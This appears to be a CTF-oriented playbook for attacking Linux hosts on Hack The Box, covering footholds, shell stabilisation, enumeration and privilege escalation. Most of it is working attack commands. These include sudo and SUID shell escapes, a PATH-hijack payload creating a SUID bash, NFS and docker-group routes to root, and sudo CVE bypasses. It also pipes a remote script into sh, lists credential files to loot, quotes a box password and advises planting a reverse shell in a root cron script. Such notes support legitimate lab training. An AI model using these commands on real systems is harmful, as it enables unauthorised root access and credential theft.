# Linux Attack Flow

> Holistic flow for attacking a Linux host. Optimised for HTB-style boxes
> where misconfigurations dominate kernel exploits.

## Foothold flow

The vast majority of HTB Linux foothold paths are one of these:

1. **Web RCE** (CMS exploit, custom-app SQLi/SSTI/upload, exposed CGI).
2. **Service misconfig** (FTP anon → SSH key, NFS world-writable export,
   Samba writable share).
3. **Banner-fingerprinted CVE** (Drupalgeddon, Shellshock, Heartbleed,
   Magento RCE, etc.).
4. **Default / weak creds** (rarely SSH; commonly databases, admin panels).

Open-port priority for Linux: 80 → 443 → 22 → 21 → 25 → others.

## First 60 seconds on a Linux shell

```bash
id
hostname
uname -a
cat /etc/os-release
sudo -l                                   # the single highest-leverage command
ls -la ~ /root /home/* 2>/dev/null
cat ~/.bash_history 2>/dev/null
env | grep -v ^_
```

The `sudo -l` output frequently ends the box (OpenAdmin's `sudo nano`
pattern).

## Stabilisation

```bash
# 1. Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (alternatives: script /dev/null -c bash ; perl -e 'exec "/bin/bash";')

# 2. Background, set local terminal raw
^Z
stty raw -echo; fg
export TERM=xterm

# 3. Optional: match terminal size
stty rows 50 cols 200
```

Always do this before running interactive tools (`ssh`, `mysql`, `vi`,
`sudo`).

## Enumeration tools

```bash
# linpeas — the broadest-scope automated enum
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Smaller, focused alternatives
./LinEnum.sh -t
./linux-exploit-suggester.sh
./pspy64                                 # process snooping; great for cron / scheduled tasks
```

`pspy` is special — it shows you processes started by other users without
requiring root. Always run it for at least 5 minutes when stuck looking
for a privesc; cron jobs that fire every minute become visible.

## Privilege escalation categories (priority order)

### 1. `sudo -l` rules
By far the most common privesc on HTB.
Check each allowed binary against `gtfobins.github.io`. Examples:
- `nano` → `^R` `^X` `reset; bash 1>&0 2>&0`
- `vim` → `:!sh`
- `less` / `more` → `!sh`
- `find` → `find . -exec /bin/sh \; -quit`
- `awk` → `awk 'BEGIN {system("/bin/sh")}'`
- `tar` → `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

OpenAdmin's path: `sudo /bin/nano /opt/priv` → from inside nano, escape.

### 2. SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
Compare to GTFOBins. Custom SUIDs (binaries built for the box) are
suspect — `strings` and `ltrace` them:
```bash
strings /path/to/suid | head -50
ltrace /path/to/suid 2>&1 | head -30
```

### 3. Capabilities
```bash
getcap -r / 2>/dev/null
```
Look for `cap_setuid+ep`, `cap_dac_read_search+ep`, etc.

### 4. Cron jobs
```bash
ls -la /etc/cron.* /etc/crontab /var/spool/cron/ 2>/dev/null
cat /etc/crontab
```
And via pspy:
```
pspy64 | grep -E 'CMD|EXEC'
```

Cron jobs running as root that touch a writable file are end-game. Bashed
is the canonical example: `/scripts/test.py` writable, executed by root
cron every minute.

### 5. Writable PATH
If a script run as root calls a binary by name (not full path), and a
directory earlier in `PATH` is writable, drop a malicious binary there.

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/<binary>
chmod +x /tmp/<binary>
export PATH=/tmp:$PATH
# trigger the script
/tmp/bash -p
```

### 6. Writable services / units
```bash
systemctl list-units --type=service
ls -la /etc/systemd/system/
```
A writable service unit is a privesc; modify ExecStart, restart service.

### 7. Sudo CVEs
Specific older versions bypass:
- `CVE-2019-14287` — `sudo -u#-1` (sudo < 1.8.28).
- `CVE-2021-3156` (Baron Samedit) — pwfeedback heap overflow.
- `CVE-2023-22809` — `sudoedit` env var EDITOR= injection.

### 8. NFS misconfigurations
```bash
showmount -e <ip>
mount -t nfs <ip>:/<export> /mnt
# if no_root_squash, drop a SUID bash:
cp /bin/bash /mnt/bash; chmod +s /mnt/bash
# back on victim:
/<export>/bash -p
```

### 9. Docker / LXD groups
- Member of `docker` group → root via `docker run -v /:/mnt --rm -it alpine chroot /mnt`.
- Member of `lxd` group → root via Alpine image trick.

### 10. Kernel exploits
Last resort. Identify with `linux-exploit-suggester.sh`. Compile and
test offline first; wrong-kernel kernel exploits panic the host.

## Credential reuse on Linux

- Database passwords reused for system accounts (OpenAdmin pattern: ONA
  DB password = `jimmy:n1nj4WarR10R!` system account).
- SSH keys in unusual locations: `/var/backups/`, `/opt/`, app data
  directories.
- `mysql_history`, `psql_history`, `bash_history`, `.gnupg/`,
  `.aws/credentials`, `.kube/config`.

## Spotting the writable cron pattern

Symptoms that a cron-based privesc is intended:
- A script in `/opt`, `/scripts`, `/usr/local/bin` that is owned by user
  but **executed by root**.
- A file timestamp that updates every minute.
- A `/var/log/` entry that grows on a schedule.
- `pspy` shows root running a script you can write to.

Action: append a reverse shell or `chmod +s /bin/bash` to the script and
wait one cycle.

## See also

- [08-privilege-escalation-heuristics.md](08-privilege-escalation-heuristics.md)
- [12-shell-stabilization.md](12-shell-stabilization.md)
- [../linux-privesc/](../linux-privesc/)
- [../privilege-escalation-checklists/linux.md](../privilege-escalation-checklists/linux.md)
